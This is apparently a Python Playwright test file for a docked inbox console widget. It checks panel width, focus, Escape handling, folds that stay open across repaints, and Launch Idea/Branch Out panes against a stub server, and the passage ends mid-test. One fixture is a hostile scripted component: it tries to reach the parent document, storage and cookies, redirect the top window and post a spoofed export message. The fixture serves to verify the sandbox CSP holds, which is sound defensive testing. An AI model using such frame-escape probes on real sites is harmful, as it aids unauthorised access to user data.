#!/usr/bin/env python3
"""The docked inbox (AB-2/Q2) in a real browser: console.js + console.css injected
into a minimal host page, against a stub /view.

CI has no browser, so this file skips unless OVERTURE_BROWSER=1 is set; with it
set, a missing Playwright or browser is a failure, never a skip. Run locally:

    OVERTURE_BROWSER=1 python3 test_browser.py
    OVERTURE_BROWSERS=chromium,firefox OVERTURE_BROWSER=1 python3 test_browser.py
"""
from __future__ import annotations

import json
import os
import re
import sys
import threading
import time
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

HERE = Path(__file__).resolve().parent
KIT = HERE / "plugin" / "kit"  # the kit ships inside the plugin, so every install carries it
sys.path.insert(0, str(KIT))
from overture import publish as P  # noqa: E402

REQUIRED = os.environ.get("OVERTURE_BROWSER") == "1"
BROWSERS = [b.strip() for b in os.environ.get("OVERTURE_BROWSERS", "chromium").split(",") if b.strip()]

# A host page with nothing of any vendoring project's in it: the kit must bring its own room.
HOST = """<!doctype html><html><head><meta charset="utf-8"><title>host</title>
<style>:root{--c-surface:#fff;--c-surface-alt:#f4f4f4;--c-border:#ccc;--c-fg:#111;
--c-fg-muted:#555;--c-accent:#0057d9;--c-claimed:#7a4b00;--c-claimed-bg:#fff3d6}
body{margin:0;font:14px sans-serif}</style></head><body>
<input id="board-input" aria-label="board input">
<details id="item-LANE.1"><summary>LANE.1 first lane</summary><p>body</p></details>
</body></html>"""


def _view(owner_message: bool = False, second_lane: bool = False, multiline: bool = False) -> dict:
    """/view exactly as the server builds it (server.py: view.build over a store),
    from two questions made by the kit tests' own fixture, so it cannot drift.
    owner_message adds one owner message on LANE.1 with no agent reply, which
    puts that item in awaiting_agent; second_lane adds LANE.2 with one too."""
    import tempfile
    from overture import view as V
    from overture.store import Store
    from test_kit import message, question
    items = {"LANE.1": {"title": "first lane", "parent": None}}
    if second_lane:
        items["LANE.2"] = {"title": "second lane", "parent": None}
    with tempfile.TemporaryDirectory() as td:
        st = Store(Path(td) / "store.jsonl", known_items=items)
        st.append(question("LANE.1/Q1"))
        st.append(question("LANE.1/Q2"))
        if owner_message:
            st.append(message(item="LANE.1"))
        if second_lane:
            st.append(message(item="LANE.2"))
        if multiline:  # 0.8.4: an owner message and an agent reply, each over three lines
            st.append(message(item="LANE.1", text=MULTILINE_OWNER))
            st.append(message(item="LANE.1", by="agent", text=MULTILINE_REPLY))
        return {"view": V.build(st, items, lambda c: True), "items": items, "cursor": {}}


MULTILINE_OWNER = "first owner line\nsecond owner line\nthird owner line"
MULTILINE_REPLY = "Recorded.\n\n- one\n- two"
VIEW = _view()
VIEW_MULTILINE = _view(multiline=True)
VIEW_AGENT = _view(owner_message=True)
VIEW_AGENT2 = _view(owner_message=True, second_lane=True)
assert VIEW_AGENT["view"]["awaiting_agent"] == ["LANE.1"], VIEW_AGENT["view"]["awaiting_agent"]
assert sorted(VIEW_AGENT2["view"]["awaiting_agent"]) == ["LANE.1", "LANE.2"], VIEW_AGENT2["view"]["awaiting_agent"]
assert VIEW["view"]["awaiting_agent"] == [], VIEW["view"]["awaiting_agent"]
PAGE = P.inject(HOST, P.console_block('{"api": "/api"}'))


# The lane board (AB-2/Q4): the REAL page, rendered from the real register, so
# console.js is held to dashboard.apply_live -- the patcher the shape is built on.
# It lives in the project that hosts the kit (OVERTURE_BOARD_DIR, default the
# layout the kit was born in); without it LiveBoardTests skip, by name.
BOARD_DIR = Path(os.environ.get("OVERTURE_BOARD_DIR", HERE.parent.parent / "scripts/register"))
if (BOARD_DIR / "dashboard.py").is_file():
    sys.path.insert(0, str(BOARD_DIR))
    import dashboard as D  # noqa: E402

    REGISTER = D.load()
    # open -> proposed moves no "claimed by" line and no "waits on" link: the shape holds.
    FLIPPED = {i: ({**d, "status": "proposed"} if d["status"] == "open" and n % 7 == 0 else d)
               for n, (i, d) in enumerate(sorted(REGISTER.items()))}
    BOARD_A, BOARD_B = D.board_live(REGISTER), D.board_live(FLIPPED)
    LIVE_PAGES = {"/board-a": P.inject(D.render_html(REGISTER)[0], P.console_block('{"api": "/api"}')),
                  "/board-b": P.inject(D.render_html(FLIPPED)[0], P.console_block('{"api": "/api"}'))}
else:
    D = None
    BOARD_A = BOARD_B = None
    LIVE_PAGES = {}


class _Handler(BaseHTTPRequestHandler):
    view_delay = 0.0   # seconds before /view answers (a slow server)
    view_fails = False  # /view answers 503 (a server that is down)
    view_agent = False  # /view carries one thread waiting on the agent
    view_multiline = False  # /view carries a thread whose messages span several lines (0.8.4)
    view_working = False  # ...and the cursor says an agent is working on it
    view_listening = None  # the cursor's `listening`; None leaves it out, as a pre-0.6.0 server
    view_designs = False  # ...and it links a Claude Design whose artifact list an agent posted (1.33)
    view_scripts = False  # ...and its newest version has the owner's Scripts switch on (1.33)
    view_ux = False     # LANE.1 is a UX item with two HTML visuals (UX View, 1.33)
    view_lessons = False  # LANE.1/Q2 carries one related past ruling, as server.page_payload attaches it (1.34)
    post_delay = 0.0   # seconds before a POST answers, so the page can act while one is in flight (1.34.7)
    posts: list = []    # the JSON bodies POSTed to /api/message
    board: object = None   # what /api/board answers; None is 404, as a project with no board()
    board_status = 200
    board_hits = 0

    def log_message(self, *args):
        pass

    def do_GET(self):
        status = 200
        if self.path.startswith("/api/view"):
            import time
            time.sleep(_Handler.view_delay)
            status = 503 if _Handler.view_fails else 200
            payload = dict(VIEW_MULTILINE if _Handler.view_multiline else VIEW_AGENT2 if _Handler.view_agent == 2
                           else VIEW_AGENT if _Handler.view_agent else VIEW)
            if _Handler.view_ux:
                payload["items"] = {**payload["items"], "LANE.1": {**payload["items"]["LANE.1"], "ux": True}}
                vs = [{"id": f"v{n}", "seq": 10 + n, "ts": f"2026-10-11T0{n}:00:00Z", "item": "LANE.1", "request": "rq",
                       "format": "html", "title": "Save button", "text": f"Version {n}", "path": f"p{n}.html",
                       "doc_path": f"p{n}.md", "bytes": 40, "agent": "agent-2"}
                       for n in range(1, (_Handler.view_ux if isinstance(_Handler.view_ux, int) and _Handler.view_ux > 1 else 2) + 1)]
                payload["view"] = {**payload["view"], "visuals": {"LANE.1": vs}}
                if _Handler.view_designs:
                    url = "https://claude.ai/design/p/fee63c71-69b8-455c-bb5b-c7935342adc1"
                    payload["items"] = {**payload["items"], "LANE.1": {**payload["items"]["LANE.1"], "design": url}}
                    arts = [{"path": f"buttons/b{i}.html", "title": f"Button {i}"} for i in range(12)]
                    payload["view"] = {**payload["view"], "designs": {url: {"artifacts": arts, "pushed_at": "2026-10-11T08:00:00Z", "by": "agent-2"}}}
                if _Handler.view_scripts:
                    sw = {"id": "s" * 24, "seq": 99, "ts": "2026-10-11T09:00:00Z", "item": "LANE.1", "by": "owner",
                          "type": "message", "intent": "ux-scripts", "visual_id": "v2", "scripts": True, "text": "on"}
                    thr = payload["view"].get("threads", {})
                    payload["view"] = {**payload["view"], "threads": {**thr, "LANE.1": [*thr.get("LANE.1", []), sw]}}
            if _Handler.view_lessons:
                qs = payload["view"]["questions"]
                lesson = {"ts": "2026-10-01T00:00:00Z", "qid": "LANE.1/Q0", "kind": "withdraw", "score": 0.4,
                          "reason_preview": "obsolete: the upload API was replaced\nby the batch endpoint"}
                payload["view"] = {**payload["view"], "questions": {
                    **qs, "LANE.1/Q2": {**qs["LANE.1/Q2"], "related_lessons": [lesson]}}}
            if _Handler.view_working:  # an agent has marked this item id as in hand
                payload["cursor"] = {"working": {_Handler.view_working: "2026-09-29T10:00:00Z"}}
            if _Handler.view_listening is not None:  # the watch heartbeat, as the server judged it
                payload["cursor"] = {**payload.get("cursor", {}), "listening": _Handler.view_listening}
            body, ctype = json.dumps(payload), "application/json"
        elif self.path.startswith("/api/prs"):
            sha = "a" * 40
            row = lambda n, **o: {"number": n, "title": f"PR {n}", "state": "open", "draft": False, "head": f"f{n}",
                                  "base": "main", "author": "dev", "created_at": "2026-10-01T00:00:00Z",
                                  "updated_at": "2026-10-01T00:00:00Z", "merged_at": None, "closed_at": None,
                                  "url": f"https://github.com/acme/app/pull/{n}", "merge_commit": None,
                                  "checks": "success", "head_sha": sha, **o}
            body, ctype = json.dumps({"pushed": True, "note": None, "repo": "acme/app", "window_days": 30,
                                      "pushed_at": "2026-10-11T10:00:00Z", "by": "steward",
                                      "prs": [row(5), row(6, checks="pending"), row(8, draft=True), row(9, head_sha=None)]}), "application/json"
        elif self.path.startswith("/api/component-render"):
            from overture import server as SV
            body, ctype = SCRIPTED, "text/html"
            csp = SV.COMPONENT_CSP
        elif self.path.startswith("/api/visual"):
            body, ctype = "<!doctype html><title>mock</title><h1>mock</h1>", "text/html"
        elif self.path.startswith("/api/board"):
            _Handler.board_hits += 1
            status = 404 if _Handler.board is None else _Handler.board_status
            body, ctype = json.dumps(_Handler.board if status == 200 else {"error": "x"}), "application/json"
        elif self.path in LIVE_PAGES:
            body, ctype = LIVE_PAGES[self.path], "text/html"
        else:
            body, ctype = PAGE, "text/html"
        data = body.encode()
        self.send_response(status)
        if self.path.startswith("/api/component-render"):
            self.send_header("Content-Security-Policy", csp)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


    def do_POST(self):
        raw = self.rfile.read(int(self.headers.get("Content-Length") or 0))
        _Handler.posts.append(json.loads(raw or b"{}"))
        time.sleep(_Handler.post_delay)
        data = b'{"record": {}}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


# A hostile scripted component: every way out of the sealed frame it can think of, recorded in the DOM.
SCRIPTED = """<!doctype html><html><body><p id="out">pending</p><script>
const r = {};
const t = (k, f) => { try { f(); r[k] = 'reached'; } catch (e) { r[k] = 'blocked'; } };
t('parent', () => { parent.document.title; });
t('storage', () => { localStorage.getItem('x'); });
t('cookie', () => { if (document.cookie === undefined) throw 1; document.cookie; });
t('top', () => { top.location.href = 'http://127.0.0.1:1/'; top.location.href; });
parent.postMessage({type: 'ck-chart-export', svg: '<svg xmlns="http://www.w3.org/2000/svg"/>', filename: 'pwned'}, '*');
fetch('/api/view').then(() => { r.fetch = 'reached'; }, () => { r.fetch = 'blocked'; }).then(() => {
  document.getElementById('out').textContent = JSON.stringify(r); });
</script></body></html>"""

STATE = """() => {
  const q = s => document.querySelector(s);
  const shown = e => !!e && getComputedStyle(e).display !== 'none' && e.getBoundingClientRect().width > 0;
  const box = e => { const b = e.getBoundingClientRect(); return [Math.round(b.left), Math.round(b.right)]; };
  const p = q('.ck-panel'), strip = q('.ck-dock-strip');
  return {
    strip: shown(strip) ? box(strip) : null,
    badge: strip.querySelector('.ck-inbox-count').textContent,
    expanded: strip.getAttribute('aria-expanded'),
    inboxBtn: shown(q('.ck-inbox-btn')),
    open: p.getAttribute('data-open') === 'true',
    panel: p.getAttribute('data-open') === 'true' ? box(p) : null,
    modal: p.getAttribute('aria-modal'),
    role: p.getAttribute('role'),
    inert: p.inert,
    backdrop: q('.ck-backdrop').getAttribute('data-open') === 'true',
    bodyMargin: getComputedStyle(document.body).marginRight,
    focusInPanel: p.contains(document.activeElement),
    focus: document.activeElement.className || document.activeElement.id || document.activeElement.tagName,
    overflow: document.documentElement.scrollWidth > innerWidth,
  };
}"""


# 0.9.14 opens the inbox by default on a docked (wide) screen once the first /view lands, unless this
# tab's session already closed it (sessionStorage `ck-inbox-closed`). The tests below drive the panel
# from collapsed -- the strip, the button, an item badge -- so they start in the state an owner who
# has closed it once is in: deterministic, and no race with the default-open landing mid-test.
# The default-open itself is held by DockTests.test_a_docked_inbox_opens_by_default_until_closed.
INBOX_CLOSED_THIS_SESSION = "try { sessionStorage.setItem('ck-inbox-closed', '1'); } catch (e) {}"

# The footer's own words, without the Shortcuts button (#129) that sits at its end.
FOOTER_TEXT = "e => [...e.childNodes].filter(n => n.nodeType === Node.TEXT_NODE).map(n => n.textContent).join('')"

FOCUSABLE = 'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'

# The open docked column's width with nothing stored. 1.24.0 replaced the 50vw default (it "ate half of
# a 27" monitor on first open") with a fixed one, clamped to [320px, 60vw] (DOCK_W_MIN / DOCK_W_MAX_FRAC);
# the Unreleased fixes after 1.31.0 widened it from 420px to 480px, where the eight-tab strip fits; 1.48 (U1) to
# 576px, so the content beside the section rail keeps the room it had.
# console.js DOCK_W_DEFAULT and console.css --ck-col. Every docked width the tests use (1024px and up)
# has 60vw >= 614px, so the clamp never bites and the column is exactly this wide.
DOCK_COL = 576


def _expand(page, qid=None) -> None:
    """CONSOLE-kit/Q37: a locked question is one line until opened; open it (or every one) to reach its controls."""
    sel = f".ck-q-line[data-qid='{qid}'][aria-expanded='false']" if qid else ".ck-q-line[aria-expanded='false']"
    while page.locator(sel).count():
        page.locator(sel).first.click()


def _wait_for(page, expression: str, arg=None, timeout: float = 30000) -> None:
    """`page.wait_for_function`, but under the console's CSP. Playwright polls that one by calling
    `globalThis.eval` inside the page, which the 1.31 `script-src 'nonce-...'` policy refuses (as it
    should: no 'unsafe-eval'), so every wait not already true on its first look failed with an
    EvalError. `page.evaluate` goes over the devtools protocol, which the page's CSP does not govern.
    Same contract: `expression` is an expression or a function of `arg`; a throw propagates."""
    from playwright.sync_api import Error, TimeoutError
    deadline = time.monotonic() + timeout / 1000
    while True:
        try:
            if page.evaluate(expression, arg):
                return
        except Error as e:  # a navigation tore the context down mid-call: look again in the new one
            if "context was destroyed" not in str(e) and "navigat" not in str(e):
                raise
        if time.monotonic() > deadline:
            raise TimeoutError(f"_wait_for: {timeout:.0f}ms exceeded waiting for {expression}")
        page.wait_for_timeout(25)

def _playwright():
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return None
    return sync_playwright


class DockTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        if not REQUIRED:
            raise unittest.SkipTest("browser tests run only with OVERTURE_BROWSER=1")
        sp = _playwright()
        if sp is None:
            raise RuntimeError("OVERTURE_BROWSER=1 but Playwright is not installed")
        cls.server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
        threading.Thread(target=cls.server.serve_forever, daemon=True).start()
        cls.url = f"http://127.0.0.1:{cls.server.server_address[1]}/"
        cls.pw = sp().start()

    @classmethod
    def tearDownClass(cls):
        cls.pw.stop()
        cls.server.shutdown()

    def setUp(self):
        _Handler.view_ux, _Handler.view_scripts, _Handler.view_designs, _Handler.posts = False, False, False, []
        _Handler.view_delay, _Handler.view_fails, _Handler.view_agent, _Handler.view_working = 0.0, False, False, False
        _Handler.view_listening, _Handler.view_multiline, _Handler.view_lessons = None, False, False
        _Handler.post_delay = 0.0

    def _page(self, kind: str, width: int, loaded: bool = True, fresh_session: bool = False):
        browser = getattr(self.pw, kind).launch()
        self.addCleanup(browser.close)
        page = browser.new_page(viewport={"width": width, "height": 800})
        if not fresh_session:
            page.add_init_script(INBOX_CLOSED_THIS_SESSION)
        errors: list[str] = []
        page.on("pageerror", lambda e: errors.append(str(e)))
        self.addCleanup(lambda: self.assertEqual(errors, [], f"{kind}: page errors"))
        page.goto(self.url)
        if loaded:
            _wait_for(page, "document.querySelector('.ck-dock-strip .ck-inbox-count').textContent === '2'")
        return page

    def _tab_path(self, page, presses: int) -> list[bool]:
        """Press Tab `presses` times; for each stop, is focus inside the panel?"""
        seen = []
        for _ in range(presses):
            page.keyboard.press("Tab")
            seen.append(page.evaluate("document.querySelector('.ck-panel').contains(document.activeElement)"))
        return seen

    def _state(self, page) -> dict:
        page.wait_for_timeout(300)  # the body margin eases over 0.2s
        return page.evaluate(STATE)

    def test_desktop_starts_collapsed_and_opens_a_docked_column(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._page(kind, 1400)
                s = self._state(page)
                self.assertEqual(s["strip"], [1356, 1400], s)        # 44px strip on the right edge
                self.assertEqual((s["badge"], s["expanded"], s["open"]), ("2", "false", False), s)
                self.assertFalse(s["inboxBtn"], s)                    # the floating button gives way
                self.assertEqual(s["bodyMargin"], "44px", s)          # the board keeps clear of the strip
                page.click(".ck-dock-strip")
                s = self._state(page)
                self.assertEqual(s["panel"], [1400 - DOCK_COL, 1400], s)  # one click: a column, 1.24's default width
                self.assertEqual((s["modal"], s["backdrop"]), (None, False), s)
                self.assertEqual((s["role"], s["inert"]), ("complementary", False), s)  # a landmark
                self.assertEqual((s["strip"], s["expanded"], s["bodyMargin"]), (None, "true", f"{DOCK_COL}px"), s)
                self.assertTrue(s["focusInPanel"], s)
                self.assertFalse(s["overflow"], s)

    def test_a_docked_inbox_opens_by_default_until_closed(self):
        # 0.9.14. Catches: the default-open lost (a fresh docked page left collapsed), applied to the
        # overlay too (a modal over the page nobody asked for), or a close that does not stick for the
        # session (the inbox springs open again on the next load).
        for kind in BROWSERS:
            with self.subTest(browser=kind, width=1400):
                page = self._page(kind, 1400, fresh_session=True)
                _wait_for(page, "document.querySelector('.ck-panel').getAttribute('data-open') === 'true'")
                s = self._state(page)
                self.assertEqual((s["open"], s["panel"], s["strip"], s["expanded"]),
                                 (True, [1400 - DOCK_COL, 1400], None, "true"), s)
                self.assertEqual((s["modal"], s["backdrop"], s["bodyMargin"]), (None, False, f"{DOCK_COL}px"), s)
                page.focus(".ck-panel .ck-close-btn")
                page.keyboard.press("Escape")
                self.assertFalse(self._state(page)["open"])
                page.reload()
                _wait_for(page, "document.querySelector('.ck-dock-strip .ck-inbox-count').textContent === '2'")
                s = self._state(page)
                self.assertEqual((s["open"], s["strip"], s["expanded"]), (False, [1356, 1400], "false"), s)
            with self.subTest(browser=kind, width=800):
                page = self._page(kind, 800, fresh_session=True)
                page.wait_for_timeout(500)                       # long enough for a default-open to land
                s = self._state(page)
                self.assertEqual((s["open"], s["inboxBtn"], s["backdrop"]), (False, True, False), s)

    # Owner, 2026-09-29: "on big monitors can you make it 50% of the screen until
    # closed"; 1.24.0 reversed that (the 50vw dock "ate half of a 27" monitor on first
    # open, which operators closed reflexively") for a fixed default the owner can drag,
    # 480px since the fixes after 1.31.0, 576px since 1.48 (the rail). Catches: a column that still scales with the
    # screen, a column whose width and the page's margin disagree (board text under the
    # column), and a state chip that keeps its own column beside the question and
    # squeezes the text into a strip.
    COLUMN = """() => { const p = document.querySelector('.ck-panel').getBoundingClientRect();
      const qs = Array.from(document.querySelectorAll('.ck-panel .ck-q-header')).map(h => {
        const c = h.querySelector('.ck-q-state').getBoundingClientRect(), t = h.querySelector('.ck-q-textcol').getBoundingClientRect();
        return { chipAbove: c.bottom <= t.top + 1, textWide: t.width >= h.getBoundingClientRect().width - 30 }; });
      return { panel: [Math.round(p.left), Math.round(p.right)], margin: getComputedStyle(document.body).marginRight,
               overflow: document.documentElement.scrollWidth > innerWidth, qs }; }"""

    def test_an_open_docked_column_has_the_default_width(self):
        for kind in BROWSERS:
            for width in (1024, 1400, 1920):
                with self.subTest(browser=kind, width=width):
                    page = self._page(kind, width)
                    page.click(".ck-item-btn")  # an item's view, where question cards are drawn
                    page.wait_for_selector(".ck-panel .ck-q-header")
                    # the column slides in: measure once it has arrived at the right edge
                    _wait_for(page, "Math.round(document.querySelector('.ck-panel').getBoundingClientRect().right) === innerWidth")
                    got = page.evaluate(self.COLUMN)
                    self.assertEqual(got["panel"], [width - DOCK_COL, width], got)
                    self.assertEqual(got["margin"], f"{DOCK_COL}px", got)
                    self.assertFalse(got["overflow"], got)
                    self.assertTrue(got["qs"], got)  # the inbox really shows questions
                    for q in got["qs"]:
                        self.assertEqual(q, {"chipAbove": True, "textWide": True}, got)

    def test_board_stays_usable_and_escape_belongs_to_the_column(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._page(kind, 1400)
                page.click(".ck-dock-strip")
                page.click("#board-input")
                page.keyboard.type("abc")
                self.assertEqual(page.input_value("#board-input"), "abc")
                page.keyboard.press("Escape")
                s = self._state(page)
                self.assertTrue(s["open"], s)                          # Escape out on the board: stays
                page.focus(".ck-panel .ck-close-btn")
                page.keyboard.press("Escape")
                s = self._state(page)
                self.assertFalse(s["open"], s)                         # Escape inside: collapses
                self.assertEqual((s["strip"], s["focus"]), ([1356, 1400], "ck-dock-strip"), s)

    def test_item_views_dock_too(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._page(kind, 1400)
                page.click(".ck-item-btn")
                s = self._state(page)
                self.assertEqual((s["panel"], s["modal"], s["backdrop"]), ([1400 - DOCK_COL, 1400], None, False), s)
                self.assertEqual(page.get_attribute(".ck-panel", "aria-label"), "Console: LANE.1")

    LESSONS = """() => Array.from(document.querySelectorAll('details.ck-q-lessons')).map(d => ({
      open: d.open, chip: d.querySelector('summary').textContent,
      panel: getComputedStyle(d.querySelector('.ck-q-lessons-panel')).display !== 'none' ? d.querySelector('.ck-q-lesson').innerText : null }))"""

    def test_a_related_ruling_chip_opens_and_stays_open_across_a_refresh(self):
        # 1.34 put a 📎 chip on a question whose item has a similar withdrawn ruling; it had never been
        # seen in a browser. Catches: the chip missing or on the wrong question, a reason that loses its
        # line break, and (1.34.4) every repaint -- Refresh, or any live update while the owner reads --
        # building the <details> anew, so the ruling they opened snaps shut under them.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                _Handler.view_lessons = True
                page = self._page(kind, 1400)
                page.click(".ck-item-btn")
                page.wait_for_selector("details.ck-q-lessons")
                got = page.evaluate(self.LESSONS)
                self.assertEqual([(g["open"], g["chip"]) for g in got],
                                 [(False, "📎 1 related past ruling — read before answering")], got)
                page.click("summary.ck-q-lessons-chip")
                got = page.evaluate(self.LESSONS)[0]
                self.assertTrue(got["open"], got)
                self.assertIn("2026-10-01 — LANE.1/Q0", got["panel"])
                self.assertIn("WITHDRAWN", got["panel"].upper())
                self.assertIn("replaced\nby the batch", got["panel"])
                self._repaint(page, "details.ck-q-lessons")
                self.assertTrue(page.evaluate(self.LESSONS)[0]["open"], "a repaint closed the chip")
                page.click("summary.ck-q-lessons-chip")     # closing it is remembered too
                self._repaint(page, "details.ck-q-lessons")
                self.assertFalse(page.evaluate(self.LESSONS)[0]["open"])

    def _repaint(self, page, *sels) -> None:
        """Press Refresh and wait until every node `sels` matched is gone, so an assertion after it is
        about a rebuilt node: a Refresh that repainted nothing would otherwise pass any open-state test."""
        page.evaluate("sels => { window.__ckOld = sels.flatMap(s => [...document.querySelectorAll(s)]);"
                      " document.querySelector('.ck-refresh-btn').click(); }", list(sels))
        _wait_for(page, "() => window.__ckOld.length > 0 && window.__ckOld.every(e => !e.isConnected)")

    OPEN = "sels => sels.map(s => [...document.querySelectorAll(s)].map(d => d.open))"

    def test_spawning_tickets_from_launch_idea_opens_the_tickets_fold(self):
        # 1.34.6: Launch Idea redraws the panel "so the spawned tickets show in the fold", but the fold
        # was left shut, so the owner saw a closed "Tickets" line and no sign of what was made.
        # Catches: a spawn that redraws without marking the fold open, or marks a key `keepOpen` does
        # not read (the fold would stay shut just the same).
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._page(kind, 1400)
                page.click(".ck-item-btn")
                page.wait_for_selector("details.ck-tickets-fold")
                self.assertEqual(page.evaluate(self.OPEN, ["details.ck-tickets-fold"]), [[False]])
                page.click("button[aria-label^='Launch an idea']")
                page.fill("input[aria-label='Idea title']", "Try a thing")
                page.click("text=Grill it →")
                page.click("text=Draft tickets →")
                _Handler.posts.clear()
                page.click("text=Spawn selected")
                _wait_for(page, "() => !document.getElementById('ck-launch-pane')")
                self.assertTrue(any("parent_item" in p for p in _Handler.posts), _Handler.posts)
                self.assertEqual(page.evaluate(self.OPEN, ["details.ck-tickets-fold"]), [[True]],
                                 "the fold the tickets went into stayed shut")

    # Has announce() shown this message? Read from the toast host, not the body: the body's text
    # includes the console's own inline script, which holds every message it could ever show.
    TOASTED = "m => { const h = document.getElementById('ck-toasts'); return !!h && h.textContent.includes(m); }"

    @staticmethod
    def _until(page, cond, secs: float = 10) -> None:
        """Poll a Python-side condition (what the stub server saw) while the page keeps running."""
        deadline = time.time() + secs
        while not cond() and time.time() < deadline:
            page.wait_for_timeout(20)

    def test_closing_launch_idea_mid_spawn_still_files_every_ticket_under_its_item(self):
        # 1.34.7, from the 1.34.6 review: the spawn loop read the pane's live state between requests,
        # so closing the pane while a ticket was in flight threw on the next one. Catches: reading
        # `launchIdeaState` after an await, which drops every ticket after the first (the page error
        # the cleanup asserts on is that throw).
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._page(kind, 1400)
                page.click(".ck-item-btn")
                page.click("button[aria-label^='Launch an idea']")
                page.fill("input[aria-label='Idea title']", "Try a thing")
                page.click("text=Grill it →")
                page.click("text=Draft tickets →")
                picks = page.locator(".ck-launch-ticket input[type=checkbox]:checked").count()
                self.assertGreater(picks, 1, "needs a ticket after the one in flight")
                _Handler.posts.clear()
                _Handler.post_delay = 0.4
                page.click("text=Spawn selected")
                self._until(page, lambda: _Handler.posts)
                page.click("button[aria-label='Close Launch Idea']")   # the first ticket is in flight
                _wait_for(page, self.TOASTED, f"{picks} tickets spawned.")   # the last answer landed
                made = [p.get("parent_item") for p in _Handler.posts if "parent_item" in p]
                self.assertEqual(len(made), picks, _Handler.posts)
                self.assertEqual(len(set(made)), 1, made)
                self.assertEqual(page.evaluate(self.OPEN, ["details.ck-tickets-fold"]), [[True]])

    def test_an_open_wizard_pane_survives_a_repaint(self):
        # 1.34.7: renderPanel() looked the aux pane up by id only after clearing the panel, when it
        # was no longer in the document, so a Refresh or any live update threw an open Launch Idea
        # or Branch Out away mid-wizard and left its gutter behind. Catches: finding the pane after
        # the clear (or by id at all once it is detached); and a re-attach that rebuilds the pane,
        # losing what the owner typed.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._page(kind, 1400)
                page.click(".ck-item-btn")
                for opener, field in (("button[aria-label^='Launch an idea']", "input[aria-label='Idea title']"),
                                      ("button[aria-label^='Branch out on a topic']", "input[aria-label='Topic title']")):
                    page.click(opener)
                    page.fill(field, "Half-typed")
                    self._repaint(page, "details.ck-tickets-fold")
                    self.assertEqual(page.evaluate("f => { const e = document.querySelector(f);"
                                                   " return e && e.isConnected ? e.value : null; }", field),
                                     "Half-typed", opener + ": a repaint threw the pane away")

    def test_a_branch_out_pane_reopened_mid_request_is_left_open(self):
        # 1.34.7: Branch Out's research ticket and deliberate round read `branchOutState` after their
        # await. Catches: an ending that closes whatever pane is open by then, so the owner's freshly
        # reopened pane vanishes when the old request answers (and, had they closed it instead, a
        # throw); and a research ticket that leaves the fold it went into shut.
        opener = "button[aria-label^='Branch out on a topic']"
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._page(kind, 1400)
                page.click(".ck-item-btn")
                for button, done in (("Create research ticket", "Research ticket created."),
                                     ("Spawn deliberate round", "Deliberate round queued.")):
                    page.click(opener)
                    # The pane focuses its title on the next frame; filling before that frame raced it, and a late
                    # focus took the description's text into the title (flaky since 1.34.7, seen again in 1.48).
                    _wait_for(page, "document.activeElement && document.activeElement.getAttribute('aria-label') === 'Topic title'")
                    page.fill("input[aria-label='Topic title']", "Dig here")
                    page.fill("textarea[aria-label='Topic description']", "A topic long enough to dig into.")
                    page.click("text=Dig in →")
                    page.click("text=Compile →")
                    _Handler.posts.clear()
                    _Handler.post_delay = 0.5
                    page.click("text=" + button)
                    self._until(page, lambda: _Handler.posts)
                    page.click("button[aria-label='Close Branch out']")    # the request is in flight
                    page.click(opener)                                       # and the owner starts again
                    _wait_for(page, self.TOASTED, done)
                    self.assertTrue(page.evaluate("!!document.querySelector(\"[aria-label='Branch out']\")"),
                                    button + ": the old request's answer closed the pane opened since")
                self.assertEqual(page.evaluate(self.OPEN, ["details.ck-tickets-fold"]), [[True]])

    def test_folds_the_owner_opened_stay_open_across_a_repaint(self):
        # 1.34.5, from the 1.34.4 review: the lessons chip was not the only <details> the panel rebuilt
        # on every Refresh or live update. Catches: a fold built without `keepOpen`, so the tickets
        # list, the new-ticket form or an answers-sheet row the owner opened snaps shut when an agent
        # posts anything; and a key shared between two folds, so opening one opens the other.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                page = self._page(kind, 1400)
                page.click(".ck-item-btn")
                folds = ["details.ck-tickets-fold", "details.ck-ticket-new"]
                for sel in folds:                    # the form sits inside the list: open it second
                    page.wait_for_selector(sel + " > summary")
                    page.click(sel + " > summary")
                self.assertEqual(page.evaluate(self.OPEN, folds), [[True], [True]])
                self._repaint(page, *folds)
                self.assertEqual(page.evaluate(self.OPEN, folds), [[True], [True]], "a repaint closed a fold")
                page.click("details.ck-ticket-new > summary")
                self._repaint(page, *folds)
                self.assertEqual(page.evaluate(self.OPEN, folds), [[True], [False]])
                page.click(".ck-sheet-toggle")       # All answers: one <details> row per question
                page.wait_for_selector("details.ck-sheet-row > summary")
                page.locator("details.ck-sheet-row > summary").first.click()
                rows = ["details.ck-sheet-row"]
                # The first row open and only it, however many questions the stub view carries.
                first_only = lambda got: (got[0][0], any(got[0][1:]))   # noqa: E731
                self.assertEqual(first_only(page.evaluate(self.OPEN, rows)), (True, False))
                self._repaint(page, *rows)
                self.assertEqual(first_only(page.evaluate(self.OPEN, rows)), (True, False), "a repaint closed a sheet row")

    # 0.8.4, owner: messages and agent replies lost their line breaks. The text goes in by
    # textContent (never HTML), so only CSS keeps its newlines: without `white-space: pre-wrap`
    # three lines render as one. innerText follows the rendering, so it says which happened.
    LINES = """() => Array.from(document.querySelectorAll('.ck-message-text')).map(e => {
      const lh = parseFloat(getComputedStyle(e).lineHeight);
      return { text: e.innerText, html: e.innerHTML, lines: Math.round(e.getBoundingClientRect().height / lh) }; })"""

    def test_a_multi_line_message_keeps_its_line_breaks(self):
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                _Handler.view_multiline = True
                page = self._page(kind, 1400, loaded=False)
                page.wait_for_selector(".ck-item-btn")
